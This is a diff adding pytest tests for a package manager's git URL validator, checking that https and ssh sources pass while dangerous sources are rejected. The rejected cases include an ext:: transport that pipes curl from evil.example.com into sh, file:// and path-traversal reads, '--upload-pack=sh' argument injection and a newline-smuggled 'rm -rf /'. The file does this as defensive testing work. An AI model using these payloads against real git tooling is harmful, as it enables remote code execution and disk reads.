@@ -33,6 +33,21 @@ from havn.engine.transform import (
 )
 from havn.engine.transform.discovery import DuplicateModelError
 
+@pytest.fixture(autouse=True)
+def _allow_local_git_remotes(monkeypatch):
+    """Let these tests clone from bare repositories in ``tmp_path``.
+
+    ``_validate_git_url`` refuses a local path under ``git:`` in production,
+    because handing git an arbitrary local string is how ``ext::`` and
+    ``file://`` become code execution and disk reads. These tests need a real
+    remote without a network, so they open the seam explicitly. The tests that
+    assert the default behaviour close it again.
+    """
+    import havn.engine.packages as packages
+
+    monkeypatch.setattr(packages, "_ALLOW_LOCAL_GIT_REMOTES", True)
+
+
 _GIT_ENV = {
     **os.environ,
     "GIT_AUTHOR_NAME": "havn test",
@@ -152,6 +167,115 @@ def test_valid_packages_config_parses(tmp_path):
     config = load_project(project)
     assert [p.name for p in config.packages] == ["crm"]
     assert config.packages[0].rev == "v1.0.0"
+
+
+# ---------------------------------------------------------------------------
+# Git URL transports
+# ---------------------------------------------------------------------------
+
+
+@pytest.fixture
+def strict_git_urls(monkeypatch):
+    """Close the local-remote seam, so the production rules apply."""
+    import havn.engine.packages as packages
+
+    monkeypatch.setattr(packages, "_ALLOW_LOCAL_GIT_REMOTES", False)
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://github.com/example/havn-crm.git",
+        "https://user@gitlab.example.com/team/pkg",
+        "ssh://git@github.com/example/havn-crm.git",
+        "git@github.com:example/havn-crm.git",
+        "deploy@internal.example.com:packages/crm.git",
+    ],
+)
+def test_allowed_git_transports(strict_git_urls, url):
+    from havn.engine.packages import _validate_git_url
+
+    assert _validate_git_url(url) is True, url
+
+
+@pytest.mark.parametrize(
+    "label, url",
+    [
+        # git runs the command after ext:: as the transport. Remote code
+        # execution on whoever installs the package.
+        ("ext transport", "ext::sh -c 'curl evil.example.com/x | sh'"),
+        ("ext transport, spaced", "ext::git-upload-pack /etc"),
+        ("transport prefix", "transport::address"),
+        # Reads of the server's own disk.
+        ("file scheme", "file:///etc"),
+        ("file scheme, repo", "file:///home/user/secret.git"),
+        ("absolute path", "/etc"),
+        ("relative path", "../../etc"),
+        ("home path", "~/secrets.git"),
+        # Cleartext transports: whatever the network returns gets imported.
+        ("git protocol", "git://github.com/example/havn-crm.git"),
+        ("http", "http://github.com/example/havn-crm.git"),
+        # Still rejected for the old reasons.
+        ("leading dash", "--upload-pack=sh"),
+        ("newline", "https://x/y.git\nrm -rf /"),
+        ("empty", ""),
+    ],
+)
+def test_rejected_git_transports(strict_git_urls, label, url):
+    from havn.engine.packages import _validate_git_url
+
+    assert _validate_git_url(url) is False, label
+
+
+def test_a_local_directory_is_rejected_as_a_git_source(strict_git_urls, tmp_path):
+    """A real directory is still not a git source; that is what path: is for."""
+    from havn.engine.packages import _validate_git_url
+
+    (tmp_path / "pkg").mkdir()
+    assert _validate_git_url(str(tmp_path / "pkg")) is False
+
+
+def test_install_refuses_an_ext_transport(strict_git_urls, tmp_path):
+    project = _make_project(
+        tmp_path,
+        "packages:\n  - name: crm\n    git: 'ext::sh -c id'\n    rev: v1.0.0\n",
+    )
+    results = install_packages(project, load_project(project))
+    assert [r.status for r in results] == ["error"]
+    assert "invalid git URL" in results[0].message
+    assert not (project / "havn_packages" / "crm").exists()
+
+
+def test_install_refuses_a_file_url(strict_git_urls, tmp_path):
+    bare, _ = _make_package_repo(tmp_path)
+    project = _make_project(
+        tmp_path, f"packages:\n  - name: crm\n    git: file://{bare}\n    rev: v1.0.0\n"
+    )
+    results = install_packages(project, load_project(project))
+    assert [r.status for r in results] == ["error"]
+    assert "invalid git URL" in results[0].message
+    assert not (project / "havn_packages" / "crm").exists()
+
+
+def test_install_error_points_at_path_for_a_local_source(strict_git_urls, tmp_path):
+    bare, _ = _make_package_repo(tmp_path)
+    project = _make_project(
+        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
+    )
+    results = install_packages(project, load_project(project))
+    assert [r.status for r in results] == ["error"]
+    assert "use 'path:' instead of 'git:'" in results[0].message
+
+
+def test_a_local_path_source_still_installs(strict_git_urls, tmp_path):
+    """path: is the supported way to use a package on this machine."""
+    _, work = _make_package_repo(tmp_path)
+    project = _make_project(
+        tmp_path, f"packages:\n  - name: crm\n    path: {work}\n"
+    )
+    results = install_packages(project, load_project(project))
+    assert [r.status for r in results] == ["installed"]
+    assert (project / "havn_packages" / "crm" / "havn_package.yml").is_file()
 
 
 # ---------------------------------------------------------------------------
